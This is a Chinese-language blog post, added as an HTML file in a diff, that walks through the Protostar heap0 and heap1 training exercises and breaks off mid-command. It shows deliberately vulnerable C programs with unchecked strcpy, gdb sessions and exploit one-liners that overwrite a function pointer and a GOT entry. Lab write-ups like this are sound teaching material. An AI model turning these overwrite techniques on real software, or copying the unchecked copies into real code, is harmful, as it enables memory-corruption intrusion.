@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#333"><meta name="generator" content="Hexo 5.4.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#333">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ootyoo.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.10.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":{"gitalk":{"order":-2}},"activeClass":"gitalk"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+  <meta name="description" content="Heap-Overflow Writeup  1.基本介绍 练习使用的镜像来自exploit-exercises中的Protostar，该镜像覆盖的练习内容包括  buffer overflows format strings heap exploitation socket programming  这里介绍后面两个部分。">
+<meta property="og:type" content="website">
+<meta property="og:title" content="heap-overflow-writeup">
+<meta property="og:url" content="http://ootyoo.github.io/2020/11/26/heap-overflow-writeup/index.html">
+<meta property="og:site_name" content="听云楼">
+<meta property="og:description" content="Heap-Overflow Writeup  1.基本介绍 练习使用的镜像来自exploit-exercises中的Protostar，该镜像覆盖的练习内容包括  buffer overflows format strings heap exploitation socket programming  这里介绍后面两个部分。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-11-26T12:13:31.000Z">
+<meta property="article:modified_time" content="2021-09-07T04:29:45.000Z">
+<meta property="article:author" content="ootyoo">
+<meta property="article:tag" content="hacking">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://ootyoo.github.io/2020/11/26/heap-overflow-writeup/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://ootyoo.github.io/2020/11/26/heap-overflow-writeup/","path":"2020/11/26/heap-overflow-writeup/","title":"heap-overflow-writeup"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>heap-overflow-writeup | 听云楼</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+<a target="_blank" rel="noopener" href="https://github.com/ootyoo" class="github-corner" aria-label="follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#64CEAA; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">听云楼</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">小楼酒醒，星落如雨</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">9</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">2</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">22</span></a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#heap-overflow-writeup"><span class="nav-number">1.</span> <span class="nav-text"> Heap-Overflow Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.1.</span> <span class="nav-text"> 1.基本介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-heap-overflow"><span class="nav-number">1.2.</span> <span class="nav-text"> 2. heap overflow</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#21-heap0"><span class="nav-number">1.2.1.</span> <span class="nav-text"> 2.1 Heap0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#22-heap1"><span class="nav-number">1.2.2.</span> <span class="nav-text"> 2.2 Heap1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#23-heap2"><span class="nav-number">1.2.3.</span> <span class="nav-text"> 2.3 heap2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#24-heap3"><span class="nav-number">1.2.4.</span> <span class="nav-text"> 2.4 heap3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dl-loc%E5%88%86%E9%85%8D%E7%AE%97%E6%B3%95"><span class="nav-number">1.2.5.</span> <span class="nav-text"> dl-loc分配算法</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ootyoo"
+      src="/images/aa.png">
+  <p class="site-author-name" itemprop="name">ootyoo</p>
+  <div class="site-description" itemprop="description">过诸世界，闻诸道理，见诸人生</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ootyoo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ootyoo" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdn.jsdelivr.net/npm/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://ootyoo.github.io/2020/11/26/heap-overflow-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/aa.png">
+      <meta itemprop="name" content="ootyoo">
+      <meta itemprop="description" content="过诸世界，闻诸道理，见诸人生">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="听云楼">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          heap-overflow-writeup
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-11-26 20:13:31" itemprop="dateCreated datePublished" datetime="2020-11-26T20:13:31+08:00">2020-11-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2021-09-07 12:29:45" itemprop="dateModified" datetime="2021-09-07T12:29:45+08:00">2021-09-07</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="heap-overflow-writeup"><a class="markdownIt-Anchor" href="#heap-overflow-writeup"></a> Heap-Overflow Writeup</h1>
+<h2 id="1基本介绍"><a class="markdownIt-Anchor" href="#1基本介绍"></a> 1.基本介绍</h2>
+<p>练习使用的镜像来自<a target="_blank" rel="noopener" href="https://exploit-exercises.lains.space/">exploit-exercises</a>中的Protostar，该镜像覆盖的练习内容包括</p>
+<ul>
+<li>buffer overflows</li>
+<li>format strings</li>
+<li>heap exploitation</li>
+<li>socket programming</li>
+</ul>
+<p>这里介绍后面两个部分。</p>
+<span id="more"></span>
+<h2 id="2-heap-overflow"><a class="markdownIt-Anchor" href="#2-heap-overflow"></a> 2. heap overflow</h2>
+<p>heap上数据由程序在运行时通过<code>malloc/free</code>动态分配和释放。堆上漏洞包括</p>
+<ol>
+<li>堆缓冲区溢出</li>
+<li>UAF</li>
+</ol>
+<p>堆上数据排布及堆块的分配和释放需要通过堆管理器来进行，对堆漏洞利用常需要了解堆的实现机制和分配算法，这些算法往往较复杂，这也是造成堆漏洞利用的困难之一。通过protostrar的几个练习，我们将对堆的结构又一个初步了解。</p>
+<h3 id="21-heap0"><a class="markdownIt-Anchor" href="#21-heap0"></a> 2.1 Heap0</h3>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">data</span> &#123;</span><br><span class="line">  <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">fp</span> &#123;</span><br><span class="line">  <span class="built_in">int</span> (*fp)();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">winner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;level passed\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">nowinner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;level has not been passed\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">data</span> *d;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">fp</span> *f;</span><br><span class="line"></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> data));</span><br><span class="line">  f = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> fp));</span><br><span class="line">  f-&gt;fp = nowinner;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data is at %p, fp is at %p\n&quot;</span>, d, f);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(d-&gt;name, argv[<span class="number">1</span>]);</span><br><span class="line">  </span><br><span class="line">  f-&gt;<span class="built_in">fp</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>本题中，使用<code>malloc</code>在堆上分配了两个数据结构。并在其中一个数据结构中存放函数指针<code>nowinner</code>，另外一个函数中name数组<code>strcpy</code>过程存在缓冲区溢出。攻击方式为通过溢出修改函数指针为<code>winner</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./heap <span class="string">&quot;AAAA&quot;</span></span><br><span class="line">$ a=<span class="string">&quot;`python -c &#x27;print &quot;</span><span class="string">&quot;.join([chr(ord(&quot;</span>A<span class="string">&quot;)+i)*4 for i in range(26)])&#x27;`&quot;</span></span><br><span class="line">$ gdb --args heap0 <span class="string">&quot;<span class="variable">$a</span>&quot;</span></span><br><span class="line">$ (gdb) r</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault</span><br><span class="line">0x53535353 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>
+<p>可以看到跳转地址变为了<code>0x53535353='SSSS'</code>, <code>winner</code>函数地址为<code>0x08048464</code>，因此攻击代码为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./heap0 <span class="string">&quot;`python -c &#x27;print &quot;</span>A<span class="string">&quot;*72+&quot;</span>\x64\x84\x04\x08<span class="string">&quot;&#x27;`&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="22-heap1"><a class="markdownIt-Anchor" href="#22-heap1"></a> 2.2 Heap1</h3>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">internet</span> &#123;</span><br><span class="line">  <span class="type">int</span> priority;</span><br><span class="line">  <span class="type">char</span> *name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">winner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;and we have a winner @ %d\n&quot;</span>, <span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">internet</span> *i1, *i2, *i3;</span><br><span class="line"></span><br><span class="line">  i1 = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> internet));</span><br><span class="line">  i1-&gt;priority = <span class="number">1</span>;</span><br><span class="line">  i1-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  i2 = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> internet));</span><br><span class="line">  i2-&gt;priority = <span class="number">2</span>;</span><br><span class="line">  i2-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(i1-&gt;name, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(i2-&gt;name, argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;and that&#x27;s a wrap folks!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>思路：题目中有两处<code>strcpy</code>向堆上两个结构体中<code>name</code>域写入字符串。写入过程存在缓冲区溢出。第一个写入可以覆盖堆上地址，比如覆盖<code>i2-&gt;name</code>为任意值，则第二个写入以为着我们可以在<strong>任何地址上写入任何值</strong>。为调用<code>winner</code>函数，我们考虑将GOT中<code>printf</code>对应地址改写为<code>winner</code>函数地址，即可完成攻击。<br>
+攻击过程中需要使用 gdb定位具体地址和写入内容长度。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ gdb heap1</span><br><span class="line">$(gdb) b *0x080483bc 	<span class="comment">#break at &lt;malloc@plt&gt;</span></span><br><span class="line">$(gdb) r AAAA BBBB </span><br><span class="line">$(gdb) finish			<span class="comment">#i1 addr is 0x0804a008</span></span><br><span class="line">$(gdb) c</span><br><span class="line">$(gdb) finish			<span class="comment">#i1-&gt;name addr is 0x0804a018</span></span><br><span class="line">$(gdb) c</span><br><span class="line">$(gdb) finish			<span class="comment">#i2 addr is 0x0804a028</span></span><br><span class="line">$(gdb) c</span><br><span class="line">$(gdb) finish			<span class="comment">#i2-&gt;name addr is 0x0804a038</span></span><br><span class="line">$(gdb) <span class="built_in">print</span> winner		<span class="comment">#winner addr is 0x08048494</span></span><br><span class="line">$(gdb) x/3i 0x080483cc	<span class="comment">#0x080483cc is &lt;puts@plt&gt;, 得到puts在GOT中地址为0x08049774</span></span><br><span class="line">$(gdb) b *0x0804853d</span><br><span class="line">$(gdb) def hook-stop</span><br><span class="line">$(gdb) &gt; x/40wx 0x0804a008-8</span><br><span class="line">$(gdb) &gt; x/2i <span class="variable">$eip</span></span><br><span class="line">$(gdb) &gt; end</span><br><span class="line">$(gdb) r AAAA BBBB</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Starting program: /opt/protostar/bin/heap1 AAAA BBBB</span><br><span class="line"><span class="number">0x804a000</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000011</span>	<span class="number">0x00000001</span>	<span class="number">0x0804a018</span></span><br><span class="line"><span class="number">0x804a010</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000011</span>	<span class="number">0x41414141</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804a020</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000011</span>	<span class="number">0x00000002</span>	<span class="number">0x0804a038</span></span><br><span class="line"><span class="number">0x804a030</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000011</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804a040</span>:	<span class="number">0x00000000</span>	<span class="number">0x00020fc1</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804a050</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804a060</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804a070</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804a080</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804a090</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804853d</span> &lt;main+<span class="number">132</span>&gt;:	mov    eax,DWORD PTR [ebp+<span class="number">0xc</span>]</span><br><span class="line"><span class="number">0x8048540</span> &lt;main+<span class="number">135</span>&gt;:	add    eax,<span class="number">0x8</span></span><br></pre></td></tr></table></figure>
+<p>可以看到<code>i2-&gt;name</code>的地址位于’AAAA’之后，需要将该地址覆盖为<code>puts@GOT=0x08049774</code></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">(gdb) r `python -c <span class="string">&quot;print &#x27;A&#x27;*20+&#x27;\x64\x97\x04\x08&#x27;+&#x27; &#x27;+&#x27;BBBB&#x27;&quot;</span>`</span><br><span class="line">Starting program: /opt/protostar/bin/heap1 `python -c <span class="string">&quot;print &#x27;A&#x27;*20+&#x27;\x74\x97\x04\x08&#x27;+&#x27; &#x27;+&#x27;BBBB&#x27;&quot;</span>`</span><br><span class="line"><span class="number">0x804a000</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000011</span>	<span class="number">0x00000001</span>	<span class="number">0x0804a018</span></span><br><span class="line"><span class="number">0x804a010</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000011</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0x804a020</span>:	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x08049774</span></span><br><span class="line"><span class="number">0x804a030</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000011</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804a040</span>:	<span class="number">0x00000000</span>	<span class="number">0x00020fc1</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804a050</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804a060</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804a070</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804a080</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804a090</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804853d</span> &lt;main+<span class="number">132</span>&gt;:	mov    eax,DWORD PTR [ebp+<span class="number">0xc</span>]</span><br><span class="line"><span class="number">0x8048540</span> &lt;main+<span class="number">135</span>&gt;:	add    eax,<span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">Cannot access memory at address <span class="number">0x42424242</span></span><br><span class="line"><span class="number">0x42424242</span> in ?? ()</span><br><span class="line"></span><br><span class="line">(gdb) r `python -c <span class="string">&quot;print 